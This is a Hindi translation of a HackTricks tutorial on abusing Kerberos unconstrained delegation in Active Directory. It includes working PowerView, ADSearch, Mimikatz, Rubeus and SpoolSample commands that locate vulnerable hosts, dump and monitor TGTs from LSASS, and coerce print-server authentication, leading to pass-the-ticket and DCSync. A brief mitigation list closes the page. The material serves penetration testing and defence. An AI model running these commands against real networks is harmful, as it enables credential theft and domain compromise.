# असीमित डिलीगेशन

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ हैकट्रिक्स क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का विज्ञापन हैकट्रिक्स में** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या हैकट्रिक्स को पीडीएफ में डाउनलोड करने का एक्सेस** चाहिए? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**दी पीएएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**एनएफटी**](https://opensea.io/collection/the-peass-family) संग्रह देखें
* [**आधिकारिक पीएएस और हैकट्रिक्स स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) **डिस्कॉर्ड समूह** में](https://discord.gg/hRep4RUj7f) या **टेलीग्राम समूह** में शामिल हों](https://t.me/peass) या **मुझे** **ट्विटर** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, [हैकट्रिक्स रेपो](https://github.com/carlospolop/hacktricks) और [हैकट्रिक्स-क्लाउड रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके**.

</details>

## असीमित डिलीगेशन

यह एक सुविधा है जो डोमेन प्रशासक किसी **कंप्यूटर** पर सेट कर सकता है। फिर, जब भी कोई **उपयोगकर्ता कंप्यूटर पर लॉगिन करता है**, तो उस उपयोगकर्ता का **एक प्रतिलिपि TGT** DC द्वारा प्रदान किए गए TGS में **भेजी जाएगी और LSASS में मेमोरी में सहेजी जाएगी**। इसलिए, अगर आपके पास मशीन पर प्रशासक विशेषाधिकार हैं, तो आप **टिकट को डंप करके उपयोगकर्ताओं का अनुकरण** कर सकेंगे।

तो यदि डोमेन प्रशासक "असीमित डिलीगेशन" सुविधा सक्रिय करके किसी कंप्यूटर में लॉगिन करता है, और आपके पास उस मशीन में स्थानीय प्रशासक विशेषाधिकार हैं, तो आप टिकट को डंप करके कहीं भी डोमेन प्रशासक का अनुकरण कर सकेंगे (डोमेन प्राइवेस्क)।

आप **इस गुणवत्ता वाले कंप्यूटर ऑब्जेक्ट्स को खोज सकते हैं** जांच करके कि [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) विशेषता [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) शामिल है। आप इसे एलडीएपी फ़िल्टर के साथ कर सकते हैं ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, जो पावरव्यू करता है:

<pre class="language-bash"><code class="lang-bash"># असीमित कंप्यूटरों की सूची
## पावरव्यू
Get-NetComputer -Unconstrained #DCs हमेशा दिखाई देते हैं लेकिन प्राइवेस्क के लिए उपयोगी नहीं हैं
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Mimikatz के साथ टिकट निर्यात करें
</strong>privilege::debug
sekurlsa::tickets /export #सिफारिश की गई तरीका
kerberos::list /export #एक और तरीका

# लॉगिन की निगरानी करें और नए टिकट निर्यात करें
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #10 सेकंड में नए TGTs के लिए हर 10 सेकंड जांचें</code></pre>

**Mimikatz** या **Rubeus** के साथ प्रशासक (या पीडित उपयोगकर्ता) का टिकट मेमोरी में लोड करें और [**पास द टिकट**](pass-the-ticket.md) के लिए।\
अधिक जानकारी: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**असीमित डिलीगेशन के बारे में अधिक जानकारी ired.team में।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **बल प्रमाणीकरण**

यदि एक हमलावर किसी कंप्यूटर को **"असीमित डिलीगेशन" के लिए अनुमति देने में सक्षम है**, तो वह एक **प्रिंट सर्वर** को **धोखा दे सकता है** कि वह इसके खिलाफ स्वचालित रूप से लॉगिन करेगा और सर्वर की मेमोरी में एक TGT सहेजेगा।\
फिर, हमलावर उपयोगकर्ता प्रिंट सर्वर कंप्यूटर खाते का अनुकरण करने के लिए **पास द टिकट हमला** कर सकता है।

किसी भी मशीन के खिलाफ प्रिंट सर्वर लॉगिन करने के लिए आप [**SpoolSample**](https://github.com/leechristensen/SpoolSample) का उपयोग कर सकते हैं:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
यदि TGT एक डोमेन कंट्रोलर से है, तो आप एक **DCSync हमला** कर सकते हैं और DC से सभी हैश प्राप्त कर सकते हैं।\
[**इस हमले के बारे में अधिक जानकारी ired.team में।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**यहाँ अन्य तरीके हैं जिनका प्रयास करके प्रमाणीकरण को मजबूर करने के लिए:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### संरोधन

* DA/Admin लॉगिन को विशेष सेवाओं पर सीमित करें
* विशेषाधिकारी खातों के लिए "खाता संवेदनशील है और यह अनुमति नहीं दी जा सकती" सेट करें।
